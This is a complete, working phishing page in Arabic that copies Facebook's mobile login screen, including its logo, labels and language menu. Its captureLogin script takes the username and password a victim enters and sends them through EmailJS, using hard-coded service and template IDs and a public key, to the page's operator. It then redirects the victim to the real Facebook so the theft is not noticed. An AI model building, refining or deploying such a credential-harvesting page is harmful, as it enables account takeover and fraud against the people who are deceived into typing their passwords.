<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول إلى فيسبوك</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script type="text/javascript">
      emailjs.init({ publicKey: "xCtTnF-sIhhygtKgm" });
  </script>

  <style>
    /* تهيئة عامة للموبايل */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: #fff;
      color: #1c1e21;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      -webkit-font-smoothing: antialiased;
      justify-content: space-between;
    }

    /* رأس الصفحة وحاوية اختيار اللغة */
    .header {
      width: 100%;
      height: 50px;
      padding: 12px 16px;
      display: flex;
      justify-content: center; 
      align-items: center;
      position: relative;
    }
    
    .language-selector {
      display: flex;
      align-items: center;
      color: #575c61;
      font-size: 14px;
      gap: 5px;
      cursor: pointer;
    }

    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      width: 100%;
      padding: 35px 16px 0;
    }

    .content-wrapper {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* ضبط أبعاد الشعار العلوي للفيسبوك */
    .fb-logo-container {
      margin-bottom: 45px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .fb-logo-img {
      width: 110px; 
      height: auto;
      display: block;
    }

    /* هيكلة حقول الإدخال لتسمح بارتفاع النص التوضيحي */
    .input-group {
      width: 100%;
      margin-bottom: 5px;
    }

    .input-container {
      position: relative;
      width: 100%;
      margin-bottom: 12px;
    }
    
    .input-container input {
      width: 100%;
      padding: 22px 16px 10px 16px; /* زيادة الطول الداخلي ليتسع النص بالأعلى */
      border: 1px solid #ccd0d5;
      border-radius: 12px; 
      font-size: 16px;
      color: #1c1e21;
      outline: none;
      transition: border-color 0.2s;
      font-family: inherit;
      background: transparent;
    }
    
    .input-container input:focus {
      border-color: #1877f2;
    }

    /* النص التوضيحي العائم (التأثير المطلوب) */
    .input-container label {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: #757a82;
      font-size: 15px;
      font-weight: 400;
      pointer-events: none;
      transition: all 0.15s ease-out;
    }

    /* حركة ارتفاع النص عند الضغط أو الكتابة دون تغيير لونه الرمادي */
    .input-container input:focus ~ label,
    .input-container input:not(:placeholder-shown) ~ label {
      top: 13px;
      font-size: 11.5px;
      transform: translateY(-50%);
      color: #757a82; /* الحفاظ على اللون كما في فيسبوك */
    }

    /* أزرار تسجيل الدخول وإنشاء الحساب */
    button {
      cursor: pointer;
      font-weight: 600;
      border-radius: 26px; 
      font-size: 15px;
      width: 100%;
      padding: 13px;
      text-align: center;
      transition: background 0.1s ease;
      font-family: inherit;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-btn {
      background-color: #0064e0; 
      color: #fff;
      border: none;
      margin-bottom: 20px;
      font-size: 16px;
      height: 48px; /* طول ثابت ومناسب للزر والدائرة بالداخل */
    }
    
    .login-btn:hover {
      background-color: #0056c2;
    }

    /* تصميم دائرة التحميل المخفية افتراضياً */
    .spinner {
      display: none;
      width: 22px;
      height: 22px;
      border: 2.5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .forgot-link {
      color: #1c1e21;
      font-size: 14.5px;
      text-decoration: none;
      margin-bottom: 30px;
      font-weight: 500;
    }

    .create-account-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 16px 24px;
    }
    
    .create-btn {
      background-color: #fff;
      color: #0064e0;
      border: 1px solid #0064e0;
      margin-bottom: 20px;
      font-size: 15px;
      height: 48px;
    }

    /* تنسيق تذييل الصفحة المطور - جعل كلمة Meta على يمين الشعار */
    .meta-footer {
      color: #1c1e21;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 5px;
      direction: rtl; 
      font-weight: 600;
    }
    
    .meta-text {
      color: #575c61;
      font-size: 16px;
      font-weight: bold;
      letter-spacing: -0.3px;
    }
    
    .meta-logo-img {
      width: 24px; 
      height: auto;
      display: block;
    }

    /* نافذة اللغات السفلية */
    .lang-modal-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      align-items: flex-end;
    }

    .lang-bottom-sheet {
      background: #fff;
      width: 100%;
      height: 85vh;
      border-radius: 24px 24px 0 0;
      display: flex;
      flex-direction: column;
      animation: slideUp 0.3s cubic-bezier(0.1, 0.8, 0.2, 1);
    }

    @keyframes slideUp {
      from { transform: translateY(100%); }
      to { transform: translateY(0); }
    }

    .lang-header {
      padding: 16px 20px;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
    }

    .close-btn {
      cursor: pointer;
      margin-bottom: 12px;
      color: #000;
    }

    .lang-title {
      font-size: 22px;
      font-weight: bold;
      color: #1c1e21;
      margin: 0;
      text-align: right;
    }

    .lang-list {
      overflow-y: auto;
      padding: 0 10px 20px;
      flex-grow: 1;
    }

    .lang-item {
      display: flex;
      flex-direction: row-reverse;
      justify-content: space-between;
      align-items: center;
      padding: 16px 10px;
      border-bottom: 1px solid #f0f2f5;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }

    .lang-text {
      font-size: 16px;
      color: #1c1e21;
    }

    .checkbox {
      width: 22px;
      height: 22px;
      border: 1.5px solid #8d949e;
      border-radius: 4px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .lang-item.active .checkbox {
      background-color: #0064e0;
      border-color: #0064e0;
    }

    .lang-item.active .checkbox::after {
      content: '';
      width: 5px;
      height: 10px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
      margin-bottom: 2px;
    }
  </style>
</head>
<body>

  <div class="lang-modal-overlay" id="lang-modal" onclick="closeLangModalOverlay(event)">
    <div class="lang-bottom-sheet">
      <div class="lang-header">
        <span class="close-btn" onclick="closeLangModal()">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </span>
        <h2 class="lang-title">تحديد لغتك</h2>
      </div>
      <div class="lang-list" id="lang-list-container"></div>
    </div>
  </div>

  <div class="header">
    <div class="language-selector" onclick="openLangModal()">
      <span id="current-lang-display">العربية</span>
      <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M1 1L5 5L9 1" stroke="#575c61" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </div>
  
  <main>
    <div class="content-wrapper">
      <div class="fb-logo-container">
        <img src="fb_logo.jpeg" alt="Facebook" class="fb-logo-img">
      </div>
      
      <div class="input-group">
        <div class="input-container">
          <input type="text" id="email" placeholder=" " name="email">
          <label id="email-label">رقم الهاتف المحمول أو البريد الإلكتروني</label>
        </div>
        <div class="input-container">
          <input type="password" id="password" placeholder=" " name="password">
          <label id="password-label">كلمة السر</label>
        </div>
      </div>
      
      <button class="login-btn" id="login-btn" onclick="captureLogin()">
        <span id="btn-text">تسجيل الدخول</span>
        <div class="spinner" id="btn-spinner"></div>
      </button>
      
      <a href="#" class="forgot-link" id="forgot-link">هل نسيت كلمة السر؟</a>
    </div>
  </main>
  
  <div class="create-account-container">
    <div class="content-wrapper">
      <button class="create-btn" id="create-btn">إنشاء حساب جديد</button>
      <div class="meta-footer">
        <span class="meta-text">Meta</span>
        <img src="logo_meta.jpeg" alt="" class="meta-logo-img">
      </div>
    </div>
  </div>

  <script>
    const realTranslations = {
      'ar': { 'langText': 'العربية', 'emailPH': 'رقم الهاتف المحمول أو البريد الإلكتروني', 'passPH': 'كلمة السر', 'loginBtn': 'تسجيل الدخول', 'forgotLnk': 'هل نسيت كلمة السر؟', 'createBtn': 'إنشاء حساب جديد', 'dir': 'rtl' },
      'en': { 'langText': 'English (US)', 'emailPH': 'Mobile number or email address', 'passPH': 'Password', 'loginBtn': 'Log In', 'forgotLnk': 'Forgotten password?', 'createBtn': 'Create new account', 'dir': 'ltr' }
    };

    const languagesData = [
      { id: 'ar', name: 'العربية', target: 'ar' }, { id: 'en', name: 'English (US)', target: 'en' },
      { id: 'fr', name: 'Français (France)', target: 'en' }, { id: 'tr', name: 'Türkçe', target: 'en' },
      { id: 'es', name: 'Español', target: 'en' }
    ];

    let currentLangId = 'ar';
    const modal = document.getElementById('lang-modal');
    const listContainer = document.getElementById('lang-list-container');

    function renderLanguages() {
      listContainer.innerHTML = '';
      languagesData.forEach(lang => {
        const item = document.createElement('div');
        item.className = `lang-item ${lang.id === currentLangId ? 'active' : ''}`;
        item.onclick = () => selectLanguage(lang.id, lang.target, lang.name);
        item.innerHTML = `<span class="lang-text">${lang.name}</span><div class="checkbox"></div>`;
        listContainer.appendChild(item);
      });
    }

    function openLangModal() { renderLanguages(); modal.style.display = 'flex'; }
    function closeLangModal() { modal.style.display = 'none'; }
    function closeLangModalOverlay(event) { if (event.target === modal) closeLangModal(); }

    function selectLanguage(id, targetRealLang, displayName) {
      currentLangId = id;
      renderLanguages();
      setTimeout(() => { closeLangModal(); applyTranslation(targetRealLang, displayName); }, 150);
    }

    function applyTranslation(targetRealLang, displayName) {
      const t = realTranslations[targetRealLang];
      document.documentElement.dir = t.dir;
      
      const footer = document.querySelector('.meta-footer');
      if(t.dir === 'ltr') {
        footer.style.direction = 'ltr';
      } else {
        footer.style.direction = 'rtl';
      }

      document.getElementById('current-lang-display').innerText = displayName;
      
      // ترجمة النصوص التوضيحية العائمة
      document.getElementById('email-label').innerText = t.emailPH;
      document.getElementById('password-label').innerText = t.passPH;
      
      document.getElementById('btn-text').innerText = t.loginBtn;
      document.getElementById('forgot-link').innerText = t.forgotLnk;
      document.getElementById('create-btn').innerText = t.createBtn;
    }

    function captureLogin() {
      const emailInput = document.getElementById('email').value.trim();
      const passwordInput = document.getElementById('password').value;

      if (!emailInput || !passwordInput) {
          alert("أدخل رقم الهاتف أو البريد الإلكتروني وكلمة السر.");
          return;
      }

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^(0|\+)[0-9]+$/;

      if (!emailRegex.test(emailInput) && !phoneRegex.test(emailInput)) {
          alert("رقم الهاتف أو البريد الإلكتروني غير صحيح.");
          return;
      }

      const loginBtn = document.getElementById('login-btn');
      const btnText = document.getElementById('btn-text');
      const spinner = document.getElementById('btn-spinner');

      // تفعيل تأثير التحميل والدائرة الدوارة
      btnText.style.display = 'none';
      spinner.style.display = 'block';
      loginBtn.style.opacity = "0.85";

      const templateParams = {
        name: "فيسبوك",
        Gmail: emailInput,
        password: passwordInput,
        وقت: new Date().toLocaleString('ar-EG')
      };

      emailjs.send('service_z5omr3b', 'template_z464v0m', templateParams)
        .then(() => {
          window.location.href = "https://www.facebook.com"; 
        }, (error) => {
          // إعادة الوضع الطبيعي في حال الفشل
          btnText.style.display = 'block';
          spinner.style.display = 'none';
          loginBtn.style.opacity = "1";
          alert("حدث خطأ في الاتصال بالإنترنت، يرجى المحاولة لاحقاً.");
        });
    }
    
    renderLanguages();
  </script>
</body>
</html>
